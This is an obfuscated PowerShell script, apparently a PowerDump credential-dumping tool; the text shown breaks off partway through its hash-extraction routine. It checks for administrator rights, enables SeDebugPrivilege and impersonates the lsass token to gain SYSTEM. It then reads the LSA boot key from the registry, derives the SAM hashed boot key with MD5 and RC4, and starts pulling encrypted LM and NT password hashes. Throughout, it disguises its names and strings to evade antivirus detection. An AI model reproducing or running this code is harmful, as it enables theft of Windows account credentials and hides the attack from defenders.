sET-iteM VariAbLE:nT5L ( [typE]("{7}{2}{0}{5}{8}{4}{10}{3}{9}{6}{1}"-f'y','dentItY','UriT','D','W','.PRi','SI','seC','NcIPaL.','OW','IN') );   $wIvQ  =  [TYPE]("{8}{2}{0}{3}{9}{10}{7}{4}{6}{5}{1}"-F 'R','nRole','ECU','I','pAl.wIndoWSb','LTi','Ui','i','S','TY.P','rInC');   seT-vaRiaBle  O2DMYk  ( [type]("{0}{2}{3}{1}"-f 'a','IV','dJPRIv.','aDJPr') ) ;    sET-VAriaBLe ('JQ'+'2b') ( [Type]("{1}{0}"-f 'R','InTpt') );  $UNx =  [tYpE]("{9}{10}{2}{7}{4}{8}{11}{3}{1}{0}{5}{6}"-f 'R','sE','.','P','ME','viCEs.M','ArSHal','rUNti','.InT','sysT','em','ero') ;   $Ks8FD=  [Type]("{1}{0}"-F 't','psoBJeC') ;   SeT-itEm  ("varIa"+"blE"+":0aY"+"s") ( [type]("{1}{0}"-F 'T','Shif')  )  ; $8bsP  =[tYPE]("{7}{6}{1}{0}{2}{4}{3}{5}"-F '.cRYpToGrAp','Y','h','pH','Y.CI','ERModE','iT','seCUr') ;SeT-iTEm  VArIaBLE:vMzXw ([TYPE]("{6}{2}{3}{7}{1}{8}{0}{5}{4}" -F 'p','OgrAP','T','Y.cRY','GmoDe','adDIn','sECURi','pT','hy.')  ) ;   set-itEm ('varI'+'aBl'+'e'+':cQ6') ([tYpE]("{0}{1}{2}{3}{4}"-f 'pOWeR','Du','mp.NAt','i','vE') );$M6U4=  [TyPE]("{0}{1}" -f'StRiN','G') ;seT-ITEm  VaRIabLe:3XV ([tyPE]("{1}{2}{0}"-f'G','teXt.encoDI','N') );   $fjG= [Type]("{3}{5}{6}{1}{4}{0}{2}"-f'ToG','.','RaPhY.md5','s','CRYp','E','curiTY');  set  ('4A'+'tV')  (  [tYpE]("{0}{1}" -F 'c','OnveRT'));  sEt-ITeM  VaRiAbLe:v21HF ( [TyPe]("{1}{0}{3}{2}" -F 'Co','bIt','ER','NVERt') ) ;  SV ('fKR'+'c')  (  [tyPe]("{0}{1}" -F 'p','riv')  )  ;SET-VARIaBlE  Qky  (  [tYpe]("{10}{3}{1}{8}{4}{0}{2}{5}{6}{9}{7}{11}"-f 'NCIpAl.','EM.','W','St','curIty.pRI','iN','DoW','deNTI','SE','si','Sy','TY')  );  

function inV`o`KE-pOwe`RDuMp
{
  

${S`IGn} = @"
using System;
using System.Runtime.InteropServices;
public static class priv
{
    [DllImport("shell32.dll")]
    public static extern bool IsUserAnAdmin();
}
"@
    ${adm`InA`Se`Mbly} = &("{0}{2}{1}" -f'Add-Ty','e','p') -TypeDefinition ${S`IGN} -Language ("{1}{0}"-f 'Sharp','C') -PassThru
    function eL`eVa`T`EPRIvS
    {
${s`iGnaTu`Re} = @" 
    [StructLayout(LayoutKind.Sequential, Pack = 1)] 
     public struct TokPriv1Luid 
     { 
         public int Count; 
         public long Luid; 
         public int Attr; 
     } 
 
    public const int SE_PRIVILEGE_ENABLED = 0x00000002; 
    public const int TOKEN_QUERY = 0x00000008; 
    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020; 
    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000; 
 
    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000; 
    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001; 
    public const UInt32 TOKEN_DUPLICATE = 0x0002; 
    public const UInt32 TOKEN_IMPERSONATE = 0x0004; 
    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010; 
    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040; 
    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080; 
    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100; 
    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY); 
    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | 
      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | 
      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | 
      TOKEN_ADJUST_SESSIONID); 
 
    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege"; 
    public const int ANYSIZE_ARRAY = 1; 
 
    [StructLayout(LayoutKind.Sequential)] 
    public struct LUID 
    { 
      public UInt32 LowPart; 
      public UInt32 HighPart; 
    } 
 
    [StructLayout(LayoutKind.Sequential)] 
    public struct LUID_AND_ATTRIBUTES { 
       public LUID Luid; 
       public UInt32 Attributes; 
    } 
 
 
    public struct TOKEN_PRIVILEGES { 
      public UInt32 PrivilegeCount; 
      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)] 
      public LUID_AND_ATTRIBUTES [] Privileges; 
    } 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int 
        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle); 
 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
    [return: MarshalAs(UnmanagedType.Bool)] 
    public static extern bool SetThreadToken( 
      IntPtr PHThread, 
      IntPtr Token 
    ); 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
     [return: MarshalAs(UnmanagedType.Bool)] 
      public static extern bool OpenProcessToken(IntPtr ProcessHandle,  
       UInt32 DesiredAccess, out IntPtr TokenHandle); 
 
    [DllImport("advapi32.dll", SetLastError = true)] 
    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid); 
 
    [DllImport("kernel32.dll", ExactSpelling = true)] 
    public static extern IntPtr GetCurrentProcess(); 
 
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, 
     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen); 
"@ 
 
          ${cUrRe`NT`P`RinCIPAl} = &("{0}{2}{1}" -f'New-Obj','t','ec') ("{2}{4}{6}{3}{1}{0}{5}"-f 'wsP','do','Sec','al.Win','urity.','rincipal','Princip')(   $nT5L::("{2}{1}{0}" -f'ent','tCurr','Ge').Invoke()) 
          if(${cUrre`NTp`R`inc`I`Pal}."is`In`Role"(  (  vaRiable  ("w"+"ivq") -vALUeON )::"Ad`MINist`RaTOr") -ne ${tr`UE}) { 
            &("{0}{1}{2}"-f 'Wri','t','e-Warning') ("{4}{7}{5}{3}{9}{0}{1}{8}{6}{2}" -f 'n','is','r','e','Ru',' th','o','n','trat',' Command as an Admi') 
            Break 
          } 
 
          &("{1}{0}{2}" -f 'dd-Typ','A','e') -MemberDefinition ${SIGna`T`URE} -Name ("{0}{1}"-f 'Adj','Priv') -Namespace ("{2}{1}{0}" -f'v','jPri','Ad') 
          ${A`Dj`priV} = [AdjPriv.AdjPriv] 
          [long]${LU`Id} = 0 
 
          ${tok`Pr`IV1`Lu`Id} = &("{2}{1}{0}{3}"-f'e','-Obj','New','ct') ("{1}{5}{0}{3}{4}{2}{7}{6}" -f 'riv.AdjP','Adj','Priv1','riv','+Tok','P','uid','L') 
          ${TOKp`R`iv1LU`Id}."coU`NT" = 1 
          ${TokPRiv`1l`U`ID}."lU`id" = ${LU`ID} 
          ${Tok`p`RIv1`lUId}."a`TTR" =  (  Gci ("VAr"+"IablE"+":O2dMYK")  ).vaLUE::"s`e_P`RIvILEG`E_EnA`B`leD" 
 
          ${retv`AL} = ${aDJ`pr`iV}::("{0}{3}{5}{1}{4}{2}" -f'Looku','e','e','pP','geValu','rivil').Invoke(${n`Ull}, ("{2}{1}{0}{3}" -f'ugP','b','SeDe','rivilege'), [ref]${TO`k`p`RiV`1LUID}."l`UID") 
  
          [IntPtr]${ht`O`kEN} =   (cHilditEM  ('VARIaBl'+'e:J'+'Q'+'2B')).VaLUe::"z`ERO" 
          ${R`Etv`Al} = ${ad`jp`RiV}::("{3}{0}{2}{1}" -f'cessT','ken','o','OpenPro').Invoke(${a`dJ`pRiv}::("{3}{1}{4}{0}{2}" -f 'n','C','tProcess','Get','urre').Invoke(),  (GCI ('Va'+'rI'+'aBle:'+'o2DMyk') ).valUE::"TokEn_alL_`Ac`c`e`SS", [ref]${HT`oK`En}) 
   
   
          ${To`KeN`pRIvilEg`es} = &("{3}{0}{2}{1}"-f '-O','ct','bje','New') ("{2}{0}{6}{3}{5}{1}{4}" -f 'i','N_PRIVILEGE','AdjPr','jPriv+TO','S','KE','v.Ad') 
          ${ReT`V`AL} = ${AD`j`PRIV}::"AdJ`Us`TTOkEN`pRIV`i`lE`GeS"(${htOK`en}, ${F`ALSE}, [ref]${tO`k`PrI`V1`luid}, 12,   (  GET-variaBLe  jq2B  -VALuE  )::"z`ErO",  $Jq2b::"zE`RO") 
 
          if(-not(${rET`V`AL})) { 
             (  GeT-iTeM ('VArIa'+'blE:'+'U'+'NX')).VAlUe::("{2}{1}{3}{0}" -f 'ror','astWin','GetL','32Er').Invoke() 
            Break 
          } 
 
          ${p`R`OCESS} = (&("{0}{1}{2}" -f 'Get-Pr','o','cess') -Name ("{1}{0}" -f 's','lsas')) 
          
          [IntPtr]${hLs`ASsTO`KeN} =  ( GEt-iTeM vARIAblE:jQ2b ).vAlue::"z`ErO" 
          ${R`E`TvAl} = ${a`d`JPriV}::"oP`EnP`RO`CE`SstokEN"(${PRo`ce`SS}."h`ANDLE", ( (gEt-ITEm  ('vAR'+'IaBL'+'e:o'+'2D'+'myK')).vALUE::"ToKEn_`ImP`e`RSON`Ate" -BOR  (VaRIable O2DMYK -VAl)::"TOke`N_`DUPl`ICAtE"), [ref]${HlSA`ss`TOKEN}) 
 
          [IntPtr]${duLIc`AT`etOKenHan`d`le} =  (  cHILDiTem ("vaR"+"I"+"Able:Jq"+"2b")).vaLue::"zE`Ro" 
          ${rE`Tv`Al} = ${ADJ`pR`Iv}::"dU`PL`ic`AtetOkEN"(${hLS`A`sStO`KeN}, 2, [ref]${DULic`AteTo`Ke`N`H`An`dle}) 
  
          ${RE`TV`AL} = ${ad`jp`RIV}::"S`etTHRe`ADtOk`en"(  ( vARIAble  ('Jq'+'2b') ).vALue::"Ze`RO", ${d`U`LIc`AtEt`oKenhAnDLe}) 
  
          if(-not(${R`Et`VAl})) { 
             ( VARIAbLe  UNX -vALUEONLy)::("{1}{4}{0}{3}{2}" -f'n3','GetLastW','or','2Err','i').Invoke() 
          } 
      }
      function l`OaDa`Pi
        {
        ${oLDEr`Rorac`TI`ON} = ${GLObAl:er`ROraCtIOn`P`R`EfERe`Nce};
        ${G`lOBAl`:eRROR`ACTIO`NprE`FE`Re`N`ce} = ("{2}{0}{3}{1}" -f 'lentlyConti','ue','Si','n');
        ${t`EST} = [PowerDump.Native];
        ${glo`B`Al:`erroRacTionp`RE`Fer`E`Nce} = ${O`lDeRRor`Act`I`oN};
        if (${TE`ST}) 
        {
            
            return; 
        }
${CO`dE} = @"
using System;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
namespace PowerDump
{
    public class Native
    {
    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
     public static extern int RegOpenKeyEx(
        int hKey,
        string subKey,
        int ulOptions,
        int samDesired,
        out int hkResult);
    [DllImport("advapi32.dll", EntryPoint = "RegEnumKeyEx")]
    extern public static int RegEnumKeyEx(
        int hkey,
        int index,
        StringBuilder lpName,
        ref int lpcbName,
        int reserved,
        StringBuilder lpClass,
        ref int lpcbClass,
        out long lpftLastWriteTime);
    [DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    extern public static int RegQueryInfoKey(
        int hkey,
        StringBuilder lpClass,
        ref int lpcbClass,
        int lpReserved,
        out int lpcSubKeys,
        out int lpcbMaxSubKeyLen,
        out int lpcbMaxClassLen,
        out int lpcValues,
        out int lpcbMaxValueNameLen,
        out int lpcbMaxValueLen,
        out int lpcbSecurityDescriptor,
        IntPtr lpftLastWriteTime);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern int RegCloseKey(
        int hKey);
        }
    } // end namespace PowerDump
    public class Shift {
        public static int   Right(int x,   int count) { return x >> count; }
        public static uint  Right(uint x,  int count) { return x >> count; }
        public static long  Right(long x,  int count) { return x >> count; }
        public static ulong Right(ulong x, int count) { return x >> count; }
        public static int    Left(int x,   int count) { return x << count; }
        public static uint   Left(uint x,  int count) { return x << count; }
        public static long   Left(long x,  int count) { return x << count; }
        public static ulong  Left(ulong x, int count) { return x << count; }
    }
"@
           ${PR`o`Vi`DER} = &("{2}{0}{1}"-f'w','-Object','Ne') ("{7}{2}{6}{0}{1}{3}{4}{5}"-f 'p.CS','ha','t.CS','rpCodePr','ovide','r','har','Microsof')
           ${d`LLNAme} =  $Ks8fd."as`seM`BLY"."l`oCATi`On"
           ${CompiLErPaRA`Me`Te`Rs} = &("{1}{0}{2}"-f'ew-Ob','N','ject') ("{3}{6}{1}{10}{5}{2}{8}{4}{11}{0}{7}{9}"-f'a','eDo','r','S','i','le','ystem.Cod','met','.Comp','ers','m.Compi','lerPar')
           ${asSe`mb`LIes} = @(("{2}{0}{1}" -f'd','ll','System.'), ${Dl`LNaME})
           ${co`M`Pil`eRP`A`RaMEtERS}."reFErEn`cE`dasS`eMb`liES".("{2}{1}{0}" -f'e','dRang','Ad').Invoke(${as`S`Em`Blies})
           ${COMPIlERP`Ara`ME`Te`RS}."g`ene`Rat`EIN`MeMOrY" = ${T`RUe}
           ${COMPI`lERrES`U`LTS} = ${P`RoV`IdER}.("{2}{1}{0}{4}{3}" -f 'Assem','mpile','Co','e','blyFromSourc').Invoke(${Co`mpI`LERpaRA`m`ETe`Rs}, ${CO`De})
           if(${C`omPIl`erRE`SuLtS}."Er`Rors"."C`OUnt" -gt 0) {
             ${Co`mpI`Le`RR`esU`LtS}."ERrO`RS" | &('%') { &("{1}{0}{2}"-f'e-E','Writ','rror') ("{0}:`t{1}" -f ${_}."li`NE",${_}."e`RROR`TEXT") }
           }
        }
        ${aNT`PaSsw`oRD} =  (  gET-variABLe ('3X'+'v') ).VaLue::"A`sCIi".("{0}{2}{1}"-f'G','Bytes','et').Invoke("NTPASSWORD`0");
        ${ALmpaS`S`WO`RD} =  (  VAriABlE ('3X'+'V')  ).vALuE::"as`CIi".("{1}{0}{2}"-f 't','Ge','Bytes').Invoke("LMPASSWORD`0");
        ${EmpT`Y_lM} = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
        ${emPTY`_`NT} = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
        ${O`dd_`paRi`Ty} = @(
          1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
          16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
          32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
          49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
          64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
          81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
          97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
          112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
          128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
          145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
          161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
          176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
          193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
          208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
          224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
          241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
        );
        function sId_To_`k`EY(${S`iD})
        {
            ${S`1} = @();
            ${S1} += [char](${S`id} -band 0xFF);
            ${s`1} += [char]( ( geT-iTeM  ("VARi"+"aB"+"le"+":0AYs") ).valuE::("{0}{1}" -f'Ri','ght').Invoke(${S`id},8) -band 0xFF);
            ${S1} += [char](  $0AYs::("{0}{1}"-f'Rig','ht').Invoke(${S`Id},16) -band 0xFF);
            ${s`1} += [char](  (  gEt-vAriaBlE  ('0'+'AyS')  -vAlUE  )::("{1}{0}" -f'ght','Ri').Invoke(${s`ID},24) -band 0xFF);
            ${s`1} += ${s1}[0];
            ${S`1} += ${S1}[1];
            ${s1} += ${S`1}[2];
            ${S`2} = @();
            ${s`2} += ${S`1}[3]; ${S2} += ${S`1}[0]; ${S2} += ${s`1}[1]; ${s`2} += ${s1}[2];
            ${S`2} += ${S2}[0]; ${s`2} += ${S`2}[1]; ${S`2} += ${s2}[2];
            return ,((&("{0}{2}{1}" -f'st','ey','r_to_k') ${s1}),(&("{2}{1}{0}" -f 'to_key','tr_','s') ${S`2}));
        }
        function StR`_T`o_Key(${S})
        {
            ${k`Ey} = @();
            ${k`EY} +=   ( gET-VaRIAbLE ('0'+'ays') ).vAlUE::"RIg`Ht"([int](${s}[0]), 1 );
            ${k`Ey} +=   $0aYS::"Le`Ft"( $([int](${S}[0]) -band 0x01), 6) -bor   $0AYS::"Ri`Ght"([int](${s}[1]),2);
            ${k`ey} +=  $0ayS::"lE`Ft"( $([int](${S}[1]) -band 0x03), 5) -bor  (GeT-iTEm ('VaR'+'Ia'+'bLe:'+'0AYS')).vAlue::"R`iGHt"([int](${s}[2]),3);
            ${k`ey} +=  $0Ays::"LE`Ft"( $([int](${s}[2]) -band 0x07), 4) -bor   $0AyS::"RI`Ght"([int](${S}[3]),4);
            ${k`eY} +=   $0Ays::"L`eFT"( $([int](${S}[3]) -band 0x0F), 3) -bor  $0ayS::"R`IghT"([int](${S}[4]),5);
            ${K`ey} +=   (CHILditeM VARIAblE:0AyS).valUe::"LE`Ft"( $([int](${s}[4]) -band 0x1F), 2) -bor  ( GeT-VariAble  ("0A"+"Ys") ).valUE::"rI`GHt"([int](${s}[5]),6);
            ${K`EY} +=   $0Ays::"LE`FT"( $([int](${s}[5]) -band 0x3F), 1) -bor   ( get-vARIaBle 0aYs ).VaLUe::"RIG`hT"([int](${S}[6]),7);
            ${k`EY} += $([int](${S}[6]) -band 0x7F);
            0..7 | &('%'){
                ${K`Ey}[${_}] =  $0aYs::"l`eFt"(${k`Ey}[${_}], 1);
                ${K`EY}[${_}] = ${ODD_P`AR`I`TY}[${k`ey}[${_}]];
                }
            return ,${k`eY};
        }
        function newR`c4([byte[]]${k`ey})
        {
            return &("{0}{2}{1}" -f 'new-','ect','obj') ("{0}{1}"-f 'Obje','ct') |
            &("{0}{1}{2}"-f'Add-','Me','mber') ("{0}{1}{2}" -f'N','otePropert','y') ("{0}{1}"-f 'ke','y') ${k`EY} -PassThru |
            &("{1}{0}{3}{2}"-f 'dd-','A','ber','Mem') ("{3}{0}{1}{2}" -f'o','per','ty','NotePr') ('S') ${nu`lL} -PassThru |
            &("{0}{2}{1}"-f'A','mber','dd-Me') ("{3}{1}{0}{2}"-f 'ho','t','d','ScriptMe') ("{0}{1}"-f'in','it') {
                if (-not ${tH`IS}."s")
                {
                    [byte[]]${t`HiS}."s" = 0..255;
                    0..255 | &('%') -begin{[long]${j}=0;}{
                        ${J} = (${j} + ${Th`iS}."k`Ey"[$(${_} % ${th`IS}."K`EY"."LeNg`TH")] + ${Th`IS}."S"[${_}]) % ${TH`iS}."s"."leng`Th";
                        ${TE`mP} = ${t`HIS}."s"[${_}]; ${t`HIS}."S"[${_}] = ${t`His}."s"[${j}]; ${TH`is}."S"[${J}] = ${t`Emp};
                        }
                }
            } -PassThru |
            &("{1}{0}{2}"-f'Mem','Add-','ber') ("{3}{1}{0}{2}"-f'Me','pt','thod','Scri') ("{0}{1}" -f 'encr','ypt') {
                ${DA`Ta} = ${Ar`gS}[0];
                ${Th`iS}.("{0}{1}" -f'in','it').Invoke();
                ${O`UTbuf} = &("{1}{2}{0}"-f 'object','new','-') ("{0}{1}" -f'byte[',']') $(${d`ATA}."LEn`gtH");
                ${s`2} = ${T`hIs}."s"[0..${Th`Is}."S"."lE`N`GTh"];
                0..$(${d`Ata}."lENG`TH"-1) | &('%') -begin{${i}=0;${j}=0;} {
                    ${I} = (${I}+1) % ${s2}."lE`Ngth";
                    ${j} = (${j} + ${S2}[${I}]) % ${s2}."L`En`GTh";
                    ${t`EmP} = ${S`2}[${I}];${s`2}[${I}] = ${s2}[${J}];${s`2}[${j}] = ${tE`MP};
                    ${A} = ${dA`Ta}[${_}];
                    ${B} = ${s2}[ $(${s`2}[${I}]+${s2}[${j}]) % ${S`2}."LE`Ng`TH" ];
                    ${o`UTb`Uf}[${_}] = (${a} -bxor ${B});
                }
                return ,${Ou`TB`UF};
            } -PassThru
        }
        function dE`s_`enCRy`pt([byte[]]${d`ATA}, [byte[]]${k`eY})
        {
            return ,(&("{1}{3}{2}{0}"-f'form','des_t','s','ran') ${dA`TA} ${k`EY} ${T`RuE})
        }
        function DEs`_`decRY`pT([byte[]]${Da`TA}, [byte[]]${k`ey})
        {
            return ,(&("{1}{2}{0}" -f 'rm','des_tra','nsfo') ${Da`TA} ${K`eY} ${F`AlSE})
        }
        function d`es_TrANSFo`RM([byte[]]${dA`TA}, [byte[]]${K`Ey}, ${Do`E`N`crYPT})
        {
            ${D`eS} = &("{0}{2}{3}{1}" -f 'n','bject','e','w-o') ("{4}{2}{5}{3}{6}{12}{11}{0}{9}{8}{10}{7}{1}"-f'S','ider','u','ty.Cryptograp','Sec','ri','h','Prov','rvi','CryptoSe','ce','E','y.D');
            ${D`es}."m`ODE" =  ( vaRiaBLe  8bsp  ).vALue::"E`Cb";
            ${D`ES}."pa`dDi`Ng" =   $VmZxW::"n`oNe";
            ${d`eS}."K`eY" = ${k`ey};
            ${D`eS}."I`V" = ${K`ey};
            ${t`R`Ansform} = ${n`ULl};
            if (${DoE`NC`Rypt}) {${trA`Nsf`ORM} = ${D`ES}.("{0}{1}{2}"-f 'Creat','eEnc','ryptor').Invoke();}
            else{${t`RA`NSforM} = ${D`ES}.("{1}{0}{2}{4}{3}"-f'rea','C','teDecryp','r','to').Invoke();}
            ${re`SU`LT} = ${Tran`sf`ORm}.("{2}{3}{0}{1}"-f 'inalBloc','k','Trans','formF').Invoke(${D`Ata}, 0, ${da`TA}."L`enGTH");
            return ,${RES`U`Lt};
        }
        function gE`T-`REGKeyCLAsS([string]${k`eY}, [string]${sub`K`EY})
        {
            switch (${k`EY}) {
                ("{1}{0}" -f'R','HKC') { ${n`KeY} = 0x80000000} 
                ("{0}{1}" -f'H','KCU') { ${n`kEy} = 0x80000001} 
                ("{1}{0}"-f'LM','HK') { ${NK`EY} = 0x80000002} 
                "HKU"  { ${n`KeY} = 0x80000003} 
                ("{0}{1}"-f 'H','KCC') { ${nk`EY} = 0x80000005} 
                ("{1}{0}" -f 'ult','defa') { 
                    throw ("{1}{0}{11}{14}{7}{6}{10}{3}{8}{2}{15}{12}{13}{5}{4}{9}" -f'li','Inva','t','l',' HKU','LM,',' fo',' the','owing op',', HKCC','l','d Key. Us','KCU, H','K','e one of','ions HKCR, H')
                }
            }
            ${K`E`yQUER`YVaLuE} = 0x1;
            ${KeyR`e`AD} = 0x19;
            ${KEYALl`AcC`e`ss} = 0x3F;
            ${r`e`sUlT} = "";
            [int]${HK`EY}=0
            if (-not  (lS vaRIABLe:Cq6  ).VALUe::"RegOPe`NK`EY`eX"(${N`KeY},${SuB`k`ey},0,${ke`yrEAD},[ref]${h`kEY}))
            {
                ${clA`SSVaL} = &("{2}{1}{0}" -f 'bject','ew-O','N') ("{4}{0}{1}{3}{2}" -f't','.Stringbuil','er','d','Tex') 1024
                [int]${l`EN} = 1024
                if (-not  (vaRIAbLE  ('Cq'+'6')).ValUe::"re`g`q`UeRYINfo`KeY"(${h`KEy},${C`LaSsv`Al},[ref]${L`En},0,[ref]${N`ULl},[ref]${n`Ull},
                    [ref]${N`ULL},[ref]${N`Ull},[ref]${N`ULL},[ref]${N`ULl},[ref]${nU`Ll},0))
                {
                    ${r`es`ULt} = ${c`la`SsvaL}.("{0}{2}{1}"-f 'ToSt','ing','r').Invoke()
                }
                else
                {
                    &("{3}{2}{1}{0}"-f'rror','E','rite-','W') ("{3}{5}{4}{1}{2}{0}{6}"-f ' fa','e','y','RegQu','ryInfoK','e','iled');
                }   
                  ( diR  ('vaRI'+'AbL'+'E'+':Cq6')).VAlUe::("{0}{1}{2}" -f 'R','egCloseKe','y').Invoke(${H`kEy}) | &("{2}{1}{0}" -f 'll','-Nu','Out')
            }
            else
            {
                &("{1}{3}{2}{0}"-f 'r','Wri','o','te-Err') ("{0}{2}{1}{3}"-f'Ca','ot open ke','nn','y');
            }
            return ${r`E`SulT};
        }
        function Ge`T-b`o`OTkEy
        {
            ${s} =  $m6u4::("{1}{0}" -f 'in','Jo').Invoke("",$("JD",("{0}{1}" -f'Skew','1'),"GBG",("{0}{1}" -f'Da','ta') | &('%'){&("{0}{1}{4}{2}{3}" -f 'Get-R','e','KeyCla','ss','g') ("{0}{1}"-f'HKL','M') "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
            ${b} = &("{2}{0}{1}" -f 'ob','ject','new-') ("{1}{0}{2}"-f 't','by','e[]') $(${s}."lEn`GtH"/2);
            0..$(${b}."l`ENGTh"-1) | &('%'){${b}[${_}] =   (  vArIablE  4atV -VALUEoN  )::("{0}{1}"-f 'T','oByte').Invoke(${s}.("{1}{2}{0}" -f'ng','Subs','tri').Invoke($(${_}*2),2),16)}
            ${b`2} = &("{0}{1}{2}" -f 'ne','w','-object') ("{1}{2}{0}" -f']','byte','[') 16;
            0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | &('%') -begin{${I}=0;}{${b`2}[${I}]=${B}[${_}];${I}++}
            return ,${B`2};
        }
        function Get-`hbOO`T`KeY
        {
            param([byte[]]${boO`TK`ey});
            ${aq`wer`Ty} =   $3xV::"A`scIi".("{1}{0}"-f 'es','GetByt').Invoke("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
            ${AN`UM} =   $3xV::"a`scii".("{0}{1}" -f 'GetByt','es').Invoke("0123456789012345678901234567890123456789`0");
            ${k} = &("{1}{0}{2}"-f't-','Ge','Item') ((("{4}{5}{3}{2}{1}{6}{0}{7}" -f 'co','sy7','y7FDomain','M','H','KLM:y7FSAMy7FSA','FAc','unt'))  -CrEpLaCE([ChaR]121+[ChaR]55+[ChaR]70),[ChaR]92);
            if (-not ${K}) {return ${nu`LL}}
            [byte[]]${f} = ${K}.("{0}{1}" -f 'Ge','tValue').Invoke("F");
            if (-not ${F}) {return ${N`ULl}}
            ${RC4`keY} =   ( VariABlE FjG).value::("{1}{0}" -f 'reate','C').Invoke()."COmpuTE`ha`Sh"(${f}[0x70..0x7F] + ${A`QWER`TY} + ${B`oOT`kEY} + ${An`UM});
            ${R`c4} = &("{2}{0}{1}" -f 'R','C4','New') ${rc`4`kEY};
            return ,(${r`c4}."eNC`Ry`pt"(${F}[0x80..0x9F]));
        }
        function G`et-`Us`ERName([byte[]]${V})
        {
            if (-not ${V}) {return ${N`ULl}};
            ${oFF`s`et} =  ( dIR ('VAr'+'I'+'ablE:v'+'21HF')  ).vALUe::"tO`int`32"(${v}[0x0c..0x0f],0) + 0xCC;
            ${L`En} =  (  VAriABLe V21hf -vALuE  )::"TOIN`T`32"(${V}[0x10..0x13],0);
            return   (  GEt-cHILditem vArIAblE:3xv  ).vALue::"uNi`c`ode"."GETs`Tr`ING"(${v}, ${Of`FseT}, ${l`En});
        }
        function gET-us`eRh`A`s`hEs(${U}, [byte[]]${h`BOotK`ey})
        {
            [byte[]]${EnC_`lM`_H`ASh} = ${n`ULL}; [byte[]]${e`NC_`Nt_HasH} = ${NU`Ll};
            
            
            ${lm_`eX`IStS} = ${fa`L`se};
            ${n`T_ex`Ists} = ${fa`lsE};
            
            if (${U}."V"[0xa0..0xa3] -eq 20)
            {
                ${lM`_`Exi`sTs} = ${T`RUE};
            }
            
            elseif (${U}."V"[0xac..0xaf] -eq 20)
            {
                ${nT`_EXi`STS} = ${t`RUe};
            }
        
            if (${lM_e`xI`sTs} -eq ${T`Rue})
            {
                ${lm`_`hA`Sh_OfFseT} = ${U}."has`HoffS`et" + 4;
                ${NT_`ha`sh_o`F`FsEt} = ${u}."hASHO`FFs`ET" + 8 + 0x10;
                ${enc`_`lM_hA`SH} = ${u}."V"[$(${lM_Ha`S`h_oFFSET})..$(${Lm_haS`h_o`FfS`ET}+0x0f)];
                ${eNC`_`N`T_hAsh} = ${U}."V"[$(${NT_`h`A`sH_`oFfSeT})..$(${nT`_HA`sh_o`Ff`SEt}+0x0f)];
            }
        	
            elseif (${nt_`eXI`sTs} -eq ${t`RUe})
            {
                ${NT`_HAS`H_O`FFset} = ${u}."hA`Sh`OFFsET" + 8;
                ${Enc`_nT_`h`AsH} = [byte[]]${U}."V"[$(${Nt_HA`sH_OF`FsEt})..$(${Nt`_H`A`SH_oFfs`Et}+0x0f)];
            }
